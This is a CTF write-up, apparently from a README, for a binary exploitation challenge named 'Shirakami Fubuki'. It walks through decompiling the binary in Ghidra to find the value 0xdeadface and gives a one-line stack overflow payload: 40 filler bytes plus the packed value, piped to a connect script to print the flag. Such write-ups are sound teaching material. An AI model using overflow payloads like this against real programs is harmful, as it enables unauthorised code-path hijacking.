# HOW TO SOLVE Binary Exploitation (PWN) SHIRAKAMI FUBUKI

### USE GHIDRA
Breakdown the code using `Ghidra`. Open/Create new project then import `fubuki` file. Analyze it using ghidra automation
> Image Example
![Image Example](images/Screenshot%20from%202023-11-10%2019-13-49.png)

> Your code will look different because I change some variable to make it easy to read

You will notice that the code will print the `cat flag.txt` if we pass the right input. Click on line 25 to see where pointer at and see value for buffer protocol

> Example for the value
![value](images/Screenshot%20from%202023-11-10%2019-23-40.png)

We now have value `0xdeadface` and we just need to make the python code to catch the flag.

### CREATE PYTHON CODE
> Python code example
```python
Python 2.7.18 (default, Nov 21 2022, 21:13:16) 
[GCC 12.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import struct
>>> struct.pack('<I', 0xdeadface)
'\xce\xfa\xad\xde'
>>> exit()
```
We now have a value to pass the buffer

### RUN IT
If you remember when we examine the code, the max buffer is [40]. We can create an shortcut for it. Run with command `python2 -c "print('A'*40 + '\xce\xfa\xad\xde')" | ./connect.sh` and you will rewarded with the flag.
![Result](images/Frame%201.png)
